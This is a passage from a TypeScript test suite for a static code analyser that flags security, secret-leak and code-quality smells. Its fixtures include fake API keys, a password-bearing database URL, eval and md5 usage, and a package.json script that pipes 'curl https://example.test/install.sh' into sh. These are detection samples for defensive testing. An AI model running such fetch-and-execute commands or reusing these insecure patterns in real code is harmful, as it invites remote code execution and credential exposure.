import assert from "node:assert/strict";
import { execFileSync, spawn, spawnSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { createServer as createNetServer } from "node:net";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { chdir, cwd } from "node:process";
import test from "node:test";
import { analyse, renderReport, ruleDescriptors } from "./cli.ts";
import type { AnalysisReport } from "./cli.ts";

const REPO_ROOT = cwd();
const HIGH_ENTROPY_FIXTURE_VALUE = ["Zx7pQ9vLm3N8sT2r", "Y6wK1dF4gH5jC0bR2"].join("");
const API_TOKEN_FIXTURE_VALUE = ["rN7pQ4sV9xY2zA5b", "C8dG9hK2mN5pQ8sR1"].join("");
const DATABASE_URL_FIXTURE_VALUE = ["postgres://app:superSecret", "Password@db.internal/app"].join("");
const OPENAI_KEY_FIXTURE_VALUE = ["sk-proj-AbCdEfGhIjKl", "MnOpQrStUvWxYz1234567890"].join("");
const SSN_FIXTURE_VALUE = ["123", "45", "6789"].join("-");
const AWS_ACCESS_KEY_FIXTURE_VALUE = ["AKIAABCDEFGH", "IJKLMNOP"].join("");
const PRIVATE_KEY_HEADER_FIXTURE_VALUE = ["-----BEGIN ", "PRIVATE KEY-----"].join("");
const POSTGRES_URL_FIXTURE_VALUE = ["postgres://user:sec", "ret@example.test/db"].join("");
const JWT_FIXTURE_VALUE = ["eyJhbGciOiJIUzI1NiJ9", "eyJzdWIiOiIxMjMifQ", "signature"].join(".");
const TS_IGNORE_DIRECTIVE = ["@ts", "-ignore"].join("");
const COMMENTED_OUT_SECRET_LOAD = ["const", " legacyPassword = loadSecret();"].join("");
const COMMENTED_OUT_CACHE_LOAD = ["const", " disabledCache = loadCache();"].join("");
const COMMENTED_OUT_LEGACY_CALL = ["const", " disabledLegacy = runLegacyPath();"].join("");

const expandedRuleIds = new Set([
  "complexity.npath",
  "docs.missing-param-tag",
  "docs.missing-return-tag",
  "docs.stale-param-tag",
  "docs.useless-docblock",
  "design.circular-import",
  "design.deep-relative-import",
  "design.large-module-concentration",
  "design.package-bin-missing",
  "design.package-bin-not-executable",
  "modernisation.date-now-candidate",
  "modernisation.double-cast",
  "modernisation.loose-equality",
  "modernisation.nullish-coalescing-candidate",
  "modernisation.non-null-assertion",
  "modernisation.object-spread-candidate",
  "modernisation.optional-chaining-candidate",
  "modernisation.readonly-property-candidate",
  "modernisation.tsconfig-exact-optional-disabled",
  "modernisation.tsconfig-index-safety-disabled",
  "modernisation.tsconfig-strict-disabled",
  "modernisation.ts-comment-without-rationale",
  "naming.boolean-prefix",
  "naming.class-file-mismatch",
  "naming.hungarian-notation",
  "naming.identifier-quality",
  "security.async-foreach",
  "security.disabled-tls-verification",
  "security.floating-promise",
  "security.insecure-random",
  "security.javascript-url",
  "security.new-function",
  "security.process-exec",
  "security.proto-access",
  "security.remote-install-script",
  "security.sql-concatenation",
  "security.string-timer",
  "security.throw-non-error",
  "security.url-dependency",
  "security.weak-crypto",
  "sensitive-data.api-key-pattern",
  "sensitive-data.hardcoded-env-value",
  "sensitive-data.high-entropy-string",
  "sensitive-data.pii-pattern",
  "test-quality.exception-type-only",
  "test-quality.global-state-mutation",
  "test-quality.magic-number-assertion",
  "test-quality.missing-nearby-test",
  "test-quality.mock-only-test",
  "test-quality.no-throw-only-test",
  "test-quality.setup-bloat",
  "test-quality.snapshot-only-test",
  "test-quality.trivial-assertion",
  "test-quality.unused-mock",
  "waste.commented-out-code",
  "waste.empty-function",
  "waste.exported-any",
  "waste.broad-runtime-version",
  "waste.redundant-boolean-cast",
  "waste.redundant-variable",
  "waste.swallowed-catch",
  "waste.useless-catch",
  "waste.useless-return",
  "waste.unused-import",
  "waste.unused-parameter",
]);

const RULE_QUALITY_FIXTURE_CATEGORIES = ["valid", "invalid", "noisy-valid", "missing-invalid"] as const;

type RuleQualityCategory = (typeof RULE_QUALITY_FIXTURE_CATEGORIES)[number];
type RuleQualityDescriptor = ReturnType<typeof ruleDescriptors>[number];

interface RuleQualityDoctrineCase {
  ruleId: string;
  signalSource: string;
  expectedPillar: RuleQualityDescriptor["pillar"];
  expectedSeverity: RuleQualityDescriptor["severity"];
  expectedConfidence: RuleQualityDescriptor["confidence"];
  fixtureCategories: readonly RuleQualityCategory[];
  invalidFixture: string;
  noisyValidFixture: string;
  missingInvalidFixture: string;
  falsePositiveEscapeHatch: string;
  fingerprintStability: string;
}

const riskyRuleIdsRequiringNoisyValidProof = [
  "docs.todo-density",
  "security.disabled-tls-verification",
  "security.eval-call",
  "security.new-function",
  "security.string-timer",
  "security.inner-html",
  "security.javascript-url",
  "security.process-exec",
  "security.proto-access",
  "security.weak-crypto",
  "sensitive-data.api-key-pattern",
  "sensitive-data.high-entropy-string",
  "test-quality.only-skip",
  "waste.commented-out-code",
] as const;

const riskyRuleQualityDoctrine = [
  {
    ruleId: "docs.todo-density",
    signalSource: "comment-text scanner with raw line anchors",
    expectedPillar: "documentation",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "comment markers over the configured threshold",
    noisyValidFixture: "marker words inside strings, regex bodies, and template text",
    missingInvalidFixture: "real comment markers just below and at threshold",
    falsePositiveEscapeHatch: "count only comment text, not executable literals",
    fingerprintStability: "anchor to the first real marker line",
  },
  {
    ruleId: "security.eval-call",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct eval call in executable code",
    noisyValidFixture: "eval text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "direct eval remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run only against masked executable source",
    fingerprintStability: "keep file path, rule id, executable line, and symbol identity stable",
  },
  {
    ruleId: "security.new-function",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct Function constructor in executable code",
    noisyValidFixture: "constructor text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "constructor call remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run only against masked executable source",
    fingerprintStability: "keep the executable line as the finding anchor",
  },
  {
    ruleId: "security.disabled-tls-verification",
    signalSource: "raw text scan anchored to executable TLS-disable tokens",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "NODE_TLS_REJECT_UNAUTHORIZED zero or rejectUnauthorized false",
    noisyValidFixture: "safe TLS settings and prose references to rejectUnauthorized",
    missingInvalidFixture: "literal TLS-disable tokens remain reported alongside safe settings",
    falsePositiveEscapeHatch: "require an exact disable assignment or object-property value",
    fingerprintStability: "keep the concrete TLS-disable line as the finding anchor",
  },
  {
    ruleId: "security.string-timer",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "timer call with a string callback",
    noisyValidFixture: "timer text inside comments, strings, regex bodies, templates, and arbitrary receiver methods",
    missingInvalidFixture: "string timer remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "require a global or browser timer call with a string-like first argument",
    fingerprintStability: "keep the timer call line as the finding anchor",
  },
  {
    ruleId: "security.inner-html",
    signalSource: "masked source executable-line scan",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "innerHTML assignment in executable code",
    noisyValidFixture: "innerHTML text inside comments, strings, regex bodies, and templates",
    missingInvalidFixture: "assignment remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "require an executable assignment token",
    fingerprintStability: "keep the assignment line as the finding anchor",
  },
  {
    ruleId: "security.javascript-url",
    signalSource: "raw string-literal scan guarded by executable-code position",
    expectedPillar: "security",
    expectedSeverity: "error",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "string literal that begins with javascript:",
    noisyValidFixture: "plain text mentioning javascript URLs in comments or nonmatching strings",
    missingInvalidFixture: "javascript URL literal remains reported with noisy strings present",
    falsePositiveEscapeHatch: "require the javascript: token to start in executable code",
    fingerprintStability: "anchor to the literal line without including the URL body",
  },
  {
    ruleId: "security.process-exec",
    signalSource: "masked source executable-line scan with fixed test harness exemption",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "spawn, exec, or execFile called with runtime-controlled command input",
    noisyValidFixture: "fixed local spawn or execFile command vectors inside test harness files",
    missingInvalidFixture: "dynamic child-process calls remain reported when fixed harnesses are present",
    falsePositiveEscapeHatch: "exempt only fixed local command vectors in test-like files",
    fingerprintStability: "keep the child-process call line as the finding anchor",
  },
  {
    ruleId: "security.proto-access",
    signalSource: "masked executable-line and guarded raw bracket-property scans",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "direct dot or bracket __proto__ property access",
    noisyValidFixture: "__proto__ text inside comments and unrelated string literals",
    missingInvalidFixture: "direct prototype access remains reported beside noisy strings",
    falsePositiveEscapeHatch: "require a real property access token in code",
    fingerprintStability: "keep the prototype access line as the finding anchor",
  },
  {
    ruleId: "security.weak-crypto",
    signalSource: "raw text scan anchored to executable crypto API tokens",
    expectedPillar: "security",
    expectedSeverity: "warning",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "md5, sha1, createCipher, or legacy TLS protocol options",
    noisyValidFixture: "sha256 and modern TLS options plus prose references to old algorithms",
    missingInvalidFixture: "weak crypto tokens remain reported with safe crypto nearby",
    falsePositiveEscapeHatch: "require exact weak algorithm or legacy protocol tokens",
    fingerprintStability: "keep the weak crypto line as the finding anchor",
  },
  {
    ruleId: "sensitive-data.high-entropy-string",
    signalSource: "raw text literal scanner with redacted preview metadata",
    expectedPillar: "sensitive-data",
    expectedSeverity: "error",
    expectedConfidence: "medium",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "secret-like high-entropy literal",
    noisyValidFixture: "package integrity hash and obvious placeholder literals",
    missingInvalidFixture: "secret-like literal remains reported with redacted output",
    falsePositiveEscapeHatch: "allowlist known non-secret encodings before reporting",
    fingerprintStability: "anchor to the literal line without including raw secret text",
  },
  {
    ruleId: "test-quality.only-skip",
    signalSource: "test block scan against masked executable body",
    expectedPillar: "test-quality",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "focused or skipped test marker in executable test code",
    noisyValidFixture: "focused/skipped marker text inside fixtures and documentation",
    missingInvalidFixture: "focused or skipped test remains reported when noisy fixtures are present",
    falsePositiveEscapeHatch: "run against masked test block source only",
    fingerprintStability: "anchor to the test block start line",
  },
  {
    ruleId: "waste.commented-out-code",
    signalSource: "raw line comment scanner",
    expectedPillar: "waste",
    expectedSeverity: "advisory",
    expectedConfidence: "high",
    fixtureCategories: RULE_QUALITY_FIXTURE_CATEGORIES,
    invalidFixture: "single-line comment that starts with disabled source syntax",
    noisyValidFixture: "ordinary prose comments that mention code tokens",
    missingInvalidFixture: "disabled source line remains reported when prose comments are present",
    falsePositiveEscapeHatch: "require the uncommented text to look like a statement, declaration, or call",
    fingerprintStability: "anchor to the commented-out source line",
  },
] as const satisfies readonly RuleQualityDoctrineCase[];

const riskyRuleQualityExceptions = [
  {
    ruleId: "sensitive-data.api-key-pattern",
    reason:
      "Vendor key patterns intentionally scan raw text so committed secrets in comments, fixtures, and config are still findings; noisy-valid proof is deferred to rule-specific allowlist refinements.",
  },
] as const;

test("analysis finds core TypeScript smells", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  assert.equal(ruleIds.has("security.eval-call"), true);
  assert.equal(ruleIds.has("size.parameter-count"), true);
  assert.equal(ruleIds.has("test-quality.no-assertions"), true);
  assert.equal(ruleIds.has("modernisation.public-property"), true);
});

test("existing core fixture fingerprints stay stable", () => {
  const report = analyseFixture(`export class Bad {
  public name = "demo";
  public process(a: boolean, b: string[], c: string, d: string, e: string, f: string): void {
    if (a) {
      eval(c);
    }
    console.log(b, d, e, f);
  }
}

test("sleeps without assertion", async () => {
  await new Promise((resolve) => setTimeout(resolve, 1));
});
`);
  const fingerprints = new Map(report.findings.map((finding) => [finding.ruleId, finding.fingerprint]));
  assert.equal(fingerprints.get("security.eval-call"), "9597745a32e48f52");
  assert.equal(fingerprints.get("size.parameter-count"), "d616356804967e11");
  assert.equal(fingerprints.get("test-quality.no-assertions"), "abc482609c475b4f");
  assert.equal(fingerprints.get("modernisation.public-property"), "c80058bf4fd46024");
});

test("analysis finds first-slice portable TypeScript rules", () => {
  const secret = HIGH_ENTROPY_FIXTURE_VALUE;
  // M01 portable rubric map: port-now rules use source-text, line, function-block,
  // test-block, and sensitive-data seams with standalone TypeScript fixtures.
  const report = analyseFixture(`import assert from "node:assert/strict";
import { createHash } from "node:crypto";

const data1 = "placeholder";
const embeddedToken = "${secret}";

// ${COMMENTED_OUT_SECRET_LOAD}
function hashPassword(password: string): string {
  return createHash("md5").update(password).digest("hex");
}

test("trivial assertion", () => {
  assert.equal(1, 1);
});

function testBuildsValue(): void {
  assert.equal("not a test", "not a test");
}
`);
  const firstSliceRuleIds = new Set([
    "waste.commented-out-code",
    "naming.identifier-quality",
    "test-quality.trivial-assertion",
    "security.weak-crypto",
    "sensitive-data.high-entropy-string",
  ]);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of firstSliceRuleIds) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const firstSliceFindings = report.findings.filter((finding) => firstSliceRuleIds.has(finding.ruleId));
  assert.equal(new Set(firstSliceFindings.map((finding) => finding.fingerprint)).size, firstSliceFindings.length);

  const helperTestFindings = report.findings.filter((finding) => finding.pillar === "test-quality" && finding.symbol === "testBuildsValue");
  assert.deepEqual(helperTestFindings, []);

  const secretFinding = report.findings.find((finding) => finding.ruleId === "sensitive-data.high-entropy-string");
  assert.notEqual(secretFinding, undefined);
  assert.equal(secretFinding?.message.includes(secret), false);
  assert.equal(JSON.stringify(secretFinding?.metadata).includes(secret), false);
  assert.match(JSON.stringify(secretFinding?.metadata), /redacted/);
  assert.equal(renderReport(report, "json").includes(secret), false);
});

test("core expansion clean fixture avoids new M02 findings", () => {
  const report = analyseFixture(
    `/** UserProfile stores profile state. */
export class UserProfile {
  public readonly displayName: string;

  public constructor(displayName: string) {
    this.displayName = displayName;
  }

  public getName(account?: { profile?: { name?: string } }, fallbackName?: string): string {
    return account?.profile?.name ?? fallbackName ?? this.displayName;
  }
}

/**
 * Formats a display name.
 * @param displayName Name to format.
 * @returns The formatted display name.
 */
export function formatDisplayName(displayName: string): string {
  return displayName.trim();
}

function combineNames(primaryName: string, secondaryName: string): string {
  return primaryName + secondaryName;
}

function normalizeStatus(status: string): string {
  try {
    if (status.length > 10) {
      return "long";
    }
    switch (status) {
      case "ready":
        return "ready";
      default:
        return status.trim();
    }
  } catch (error) {
    return String(error);
  }
}
`,
    { fileName: "UserProfile.ts" },
  );
  const m02RuleIds = new Set([
    "complexity.npath",
    "waste.commented-out-code",
    "waste.empty-function",
    "waste.redundant-variable",
    "waste.unused-import",
    "waste.unused-parameter",
    "naming.identifier-quality",
    "naming.boolean-prefix",
    "naming.hungarian-notation",
    "naming.class-file-mismatch",
    "docs.stale-param-tag",
    "docs.missing-param-tag",
    "docs.missing-return-tag",
    "docs.useless-docblock",
    "modernisation.readonly-property-candidate",
    "modernisation.optional-chaining-candidate",
    "modernisation.nullish-coalescing-candidate",
  ]);
  const unexpected = report.findings.filter((finding) => m02RuleIds.has(finding.ruleId));
  assert.deepEqual(unexpected, []);
});

test("core expansion finds complexity and waste rules", () => {
  const report = analyseFixture(`import { readFileSync, writeFileSync } from "node:fs";

const loadedText = readFileSync("input.txt", "utf8");

function routeOrder(state: string, unusedFlag: boolean): string {
  if (state === "new") {
    return "new";
  }
  if (state === "paid") {
    return "paid";
  }
  if (state === "sent") {
    return "sent";
  }
  if (state === "closed") {
    return "closed";
  }
  if (loadedText.length > 0) {
    return loadedText;
  }
  return "unknown";
}

// ${COMMENTED_OUT_CACHE_LOAD}
function emptyWork(): void {}

function redundantResult(): string {
  const calculatedResult = routeOrder("new", true);
  return calculatedResult;
}
`);
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "complexity.npath",
    "waste.commented-out-code",
    "waste.empty-function",
    "waste.redundant-variable",
    "waste.unused-import",
    "waste.unused-parameter",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }
  const npathFinding = report.findings.find((finding) => finding.ruleId === "complexity.npath");
  assert.match(npathFinding?.message ?? "", /capped at/);
  assert.equal(typeof npathFinding?.metadata.npath, "number");
});

test("core expansion respects npath config", () => {
  // Config contract: complexity.npath | thresholds warn/error | defaults 20/80 |
  // metadata npath,capped,cap | disabled and override fixtures below.
  const source = `function branchLightly(input: string): string {
  if (input === "a") {
    return "a";
  }
  if (input === "b") {
    return "b";
  }
  return "c";
}
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "complexity.npath"), false);

  const tightReport = analyseFixture(source, {
    config: { rules: { "complexity.npath": { thresholds: { warn: 3, error: 6 } } } },
  });
  assert.equal(tightReport.findings.some((finding) => finding.ruleId === "complexity.npath"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "complexity.npath": { enabled: false, thresholds: { warn: 1, error: 2 } } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "complexity.npath"), false);
});

test("loads default gruff yaml config", () => {
  const report = analyseProject(
    {
      "bad.ts": `function branchLightly(input: string): string {
  if (input === "a") {
    return "a";
  }
  if (input === "b") {
    return "b";
  }
  return "c";
}
`,
      ".gruff.yaml": `
rules:
  "complexity.npath":
    thresholds:
      warn: 3
      error: 6
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "complexity.npath"), true);
});

test("loads default gruff yml config", () => {
  const report = analyseProject(
    {
      "bad.ts": `const xy = 1;
console.log(xy);
`,
      ".gruff.yml": `
allowlists:
  acceptedAbbreviations: [xy]
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "naming.short-variable"), false);
});

test("loads explicit yaml config path", () => {
  const report = analyseProject(
    {
      "bad.ts": `eval("console.log(1)");
`,
      "custom-gruff.yaml": `
rules:
  security.eval-call:
    enabled: false
`,
    },
    { configPath: "custom-gruff.yaml" },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "security.eval-call"), false);
});

test("directory discovery respects root and nested gitignore rules", () => {
  const report = analyseProject(
    {
      ".gitignore": "ignored.ts\nignored-dir/\n*.ignored.ts\n!keep.ignored.ts\n",
      "tracked.ts": `eval("tracked");
`,
      "ignored.ts": `eval("ignored");
`,
      "skip.ignored.ts": `eval("skip");
`,
      "keep.ignored.ts": `eval("keep");
`,
      "ignored-dir/bad.ts": `eval("dir");
`,
      "nested/.gitignore": "*.ts\n!allowed.ts\n",
      "nested/blocked.ts": `eval("blocked");
`,
      "nested/allowed.ts": `eval("allowed");
`,
    },
    { noConfig: true },
  );

  assert.deepEqual([...evalFindingFiles(report)].sort(), ["keep.ignored.ts", "nested/allowed.ts", "tracked.ts"]);
  assert.equal(report.paths.analysedFiles, 3);
  assert.deepEqual(
    report.paths.ignoredPaths.filter((path) => ["ignored-dir", "ignored.ts", "nested/blocked.ts", "skip.ignored.ts"].includes(path)).sort(),
    ["ignored-dir", "ignored.ts", "nested/blocked.ts", "skip.ignored.ts"],
  );
});

test("gitignore fixture expectations match git check-ignore when git is available", () => {
  if (!gitAvailable()) {
    return;
  }

  const dir = mkdtempSync(join(tmpdir(), "gruff-ts-gitignore-"));
  try {
    writeFixtureFiles(dir, {
      ".gitignore": "ignored.ts\nignored-dir/\n*.ignored.ts\n!keep.ignored.ts\n",
      "tracked.ts": "",
      "ignored.ts": "",
      "skip.ignored.ts": "",
      "keep.ignored.ts": "",
      "ignored-dir/bad.ts": "",
      "nested/.gitignore": "*.ts\n!allowed.ts\n",
      "nested/blocked.ts": "",
      "nested/allowed.ts": "",
    });
    execFileSync("git", ["init"], { cwd: dir, stdio: "ignore" });

    for (const path of ["ignored.ts", "skip.ignored.ts", "ignored-dir/bad.ts", "nested/blocked.ts"]) {
      assert.equal(isGitIgnoredByGit(dir, path), true);
    }
    for (const path of ["tracked.ts", "keep.ignored.ts", "nested/allowed.ts"]) {
      assert.equal(isGitIgnoredByGit(dir, path), false);
    }
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("include ignored scans default and Git ignored paths but keeps config policy ignores", () => {
  const files = {
    ".gitignore": "ignored.ts\n",
    ".gruff.json": JSON.stringify({ paths: { ignore: ["policy/**"] } }),
    "visible.ts": `eval("visible");
`,
    "ignored.ts": `eval("ignored");
`,
    "node_modules/pkg/index.ts": `eval("dependency");
`,
    "policy/bad.ts": `eval("policy");
`,
  };

  const normalReport = analyseProject(files, { noConfig: false });
  assert.deepEqual([...evalFindingFiles(normalReport)].sort(), ["visible.ts"]);
  assert.deepEqual(
    normalReport.paths.ignoredPaths.filter((path) => ["ignored.ts", "node_modules", "policy"].includes(path)).sort(),
    ["ignored.ts", "node_modules", "policy"],
  );

  const includeReport = analyseProject(files, { includeIgnored: true, noConfig: false });
  assert.deepEqual([...evalFindingFiles(includeReport)].sort(), ["ignored.ts", "node_modules/pkg/index.ts", "visible.ts"]);
  assert.deepEqual(includeReport.paths.ignoredPaths.filter((path) => ["ignored.ts", "node_modules", "policy"].includes(path)).sort(), ["policy"]);
});

test("directory discovery includes non-gitignored repository config surfaces", () => {
  const report = analyseProject(
    {
      ".gitignore": ".claude/settings.local.json\n.codex/local.json\n",
      ".agents/config.json": "{}\n",
      ".claude/settings.json": "{}\n",
      ".claude/settings.local.json": "{}\n",
      ".codex/config.toml": "sandbox_mode = \"danger-full-access\"\n",
      ".codex/local.json": "{}\n",
      ".github/workflows/ci.yaml": "name: ci\n",
      ".goat-flow/config.yaml": "version: 1\n",
    },
    { noConfig: true },
  );

  assert.equal(report.paths.analysedFiles, 5);
  assert.deepEqual(report.paths.ignoredPaths.sort(), [".claude/settings.local.json", ".codex/local.json"]);
});

test("explicit file inputs are scanned even when gitignored", () => {
  const report = analyseProject(
    {
      ".gitignore": "ignored.ts\n",
      "ignored.ts": `eval("ignored");
`,
    },
    { noConfig: true, paths: ["ignored.ts"] },
  );

  assert.deepEqual([...evalFindingFiles(report)], ["ignored.ts"]);
  assert.equal(report.paths.analysedFiles, 1);
  assert.deepEqual(report.paths.ignoredPaths, []);
});

test("prefers default gruff json config over yaml", () => {
  const report = analyseProject(
    {
      "bad.ts": `eval("console.log(1)");
`,
      ".gruff.json": JSON.stringify({ rules: { "security.eval-call": { enabled: false } } }),
      ".gruff.yaml": `
rules:
  security.eval-call:
    enabled: true
`,
    },
    { noConfig: false },
  );
  assert.equal(report.findings.some((finding) => finding.ruleId === "security.eval-call"), false);
});

test("extended type-safety rubric finds explicit unsafety without false positives", () => {
  const unsafeReport = analyseFixture(`export function unsafeApi(input: ${"any"}): ${"any"} {
  // ${TS_IGNORE_DIRECTIVE}
  const user = input as ${"unknown"} as { profile?: { name: string } };
  return user${"!"}.profile${"!"}.name;
}
`);
  const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.ts-comment-without-rationale",
    "modernisation.non-null-assertion",
    "modernisation.double-cast",
    "waste.exported-any",
  ]) {
    assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseFixture(`function acceptsString(value: string): string {
  return value;
}

export function safeApi(input: unknown): string {
  // ${"@ts-expect-error"} -- third-party overload rejects this documented regression fixture
  acceptsString(123);
  const user = input as { profile?: { name?: string } };
  return user.profile?.name ?? "anonymous";
}
`);
  for (const ruleId of [
    "modernisation.ts-comment-without-rationale",
    "modernisation.non-null-assertion",
    "modernisation.double-cast",
    "waste.exported-any",
  ]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("extended reliability rubric finds unsafe async patterns without false positives", () => {
  const unsafeReport = analyseFixture(`async function unreliable(userIds: string[]): Promise<void> {
  userIds.forEach(${"async"} (userId) => {
    await sendEmailAsync(userId);
  });
  ${"sendEmailAsync"}(userIds[0]);
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    // ignored
  }
  throw ${JSON.stringify("failed")};
}
`);
  const unsafeRuleIds = new Set(unsafeReport.findings.map((finding) => finding.ruleId));
  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
    assert.equal(unsafeRuleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseFixture(`async function reliable(userIds: string[]): Promise<void> {
  for (const userId of userIds) {
    await sendEmailAsync(userId);
  }
  void sendEmailAsync("queued");
  return fetch("https://example.test/health").then(() => undefined);
}

async function reportsFailure(): Promise<void> {
  try {
    await sendEmailAsync("primary");
  } catch (error) {
    throw error;
  }
  throw new Error("failed");
}
`);
  for (const ruleId of ["security.async-foreach", "security.floating-promise", "waste.swallowed-catch", "security.throw-non-error"]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("extended type-safety config can disable new rules", () => {
  // Config contract: modernisation.non-null-assertion | no thresholds |
  // metadata expression | disabled fixture below.
  const source = `function readName(profile?: { name: string }): string {
  return profile${"!"}.name;
}
`;
  const defaultReport = analyseFixture(source);
  assert.equal(defaultReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), true);

  const disabledReport = analyseFixture(source, {
    config: { rules: { "modernisation.non-null-assertion": { enabled: false } } },
  });
  assert.equal(disabledReport.findings.some((finding) => finding.ruleId === "modernisation.non-null-assertion"), false);
});

test("dependency and package config health detects risky package settings", () => {
  const report = analyseProject({
    "package.json": JSON.stringify({
      scripts: {
        postinstall: "node scripts/setup.js",
        prepare: "curl https://example.test/install.sh | sh",
      },
      dependencies: {
        "wide-open": "*",
        "remote-tool": "git+https://github.com/example/remote-tool.git",
      },
      devDependencies: {
        "dev-only": "latest",
      },
    }),
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseProject({
    "package.json": JSON.stringify({
      scripts: { check: "tsc --noEmit", test: "node --test" },
      dependencies: { commander: "^14.0.2" },
      devDependencies: { "fixture-tool": "latest" },
    }),
  });
  for (const ruleId of ["security.remote-install-script", "security.risky-lifecycle-script", "security.url-dependency", "waste.broad-runtime-version"]) {
    assert.equal(cleanReport.findings.some((finding) => finding.ruleId === ruleId), false, `unexpected ${ruleId}`);
  }
});

test("package bin health detects missing and non-executable targets", () => {
  const missingReport = analyseProject({
    "package.json": JSON.stringify({ bin: { "missing-cli": "./bin/missing.js" } }),
  });
  assert.equal(missingReport.findings.some((finding) => finding.ruleId === "design.package-bin-missing"), true);

  const nonExecutableReport = analyseProject({
    "package.json": JSON.stringify({ bin: { "bad-cli": "./bin/bad.js" } }),
    "bin/bad.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
  });
  assert.equal(nonExecutableReport.findings.some((finding) => finding.ruleId === "design.package-bin-not-executable"), true);

  const noBinReport = analyseProject({
    "package.json": JSON.stringify({ scripts: { test: "node --test" } }),
  });
  assert.equal(noBinReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);

  const executableReport = analyseProject(
    {
      "package.json": JSON.stringify({ bin: { "good-cli": "./bin/good.js" } }),
      "bin/good.js": "#!/usr/bin/env node\nconsole.log('ok');\n",
    },
    { executableFiles: ["bin/good.js"] },
  );
  assert.equal(executableReport.findings.some((finding) => finding.ruleId.startsWith("design.package-bin-")), false);
});

test("tsconfig health detects disabled strictness without changing diagnostics", () => {
  const report = analyseProject({
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: false,
        noUncheckedIndexedAccess: false,
        exactOptionalPropertyTypes: false,
      },
    }),
  });
  const ruleIds = new Set(report.findings.map((finding) => finding.ruleId));
  for (const ruleId of [
    "modernisation.tsconfig-strict-disabled",
    "modernisation.tsconfig-index-safety-disabled",
    "modernisation.tsconfig-exact-optional-disabled",
  ]) {
    assert.equal(ruleIds.has(ruleId), true, `expected ${ruleId}`);
  }

  const cleanReport = analyseProject({
    "tsconfig.json": JSON.stringify({
      compilerOptions: {
        strict: true,
        noUncheckedIndexedAccess: true,
        exactOptionalPropertyTypes: true,
      },
    }),
  });
  for (const ruleId of [
